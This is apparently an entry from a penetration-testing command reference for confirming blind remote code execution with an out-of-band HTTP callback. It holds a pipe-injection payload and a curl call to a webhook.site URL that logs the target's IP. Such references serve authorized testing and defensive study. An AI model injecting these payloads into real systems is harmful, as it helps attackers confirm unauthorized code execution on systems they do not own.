---
id: cmd-curl-oob-2
data: '| curl http://webhook.site/[UNIQUE-ID]'
tags:
  - oob
  - verification
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:26.986Z'
verified: false
validated: true
submitted: true
---
# curl-webhook-oob

## Command

```bash
curl http://webhook.site/acde4291-64b0-4c2d-b4e3-0c3aeb881c6e
```

## Description

Sends an HTTP GET request to a webhook endpoint to verify out-of-band command execution during RCE testing when direct output is unavailable.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Unique webhook URL (e.g., from webhook.site) | Yes |

## Examples

### Basic Usage

```bash
curl http://webhook.site/[YOUR-ID]
```

### Advanced Usage

Add -v for verbose, but minimal for injection.

## Expected Output

Incoming HTTP request logged in the webhook service, confirming execution with target IP and timestamp.

## Related

- [[procedures/Verify-RCE-with-Out-of-Band-HTTP-Callback]]
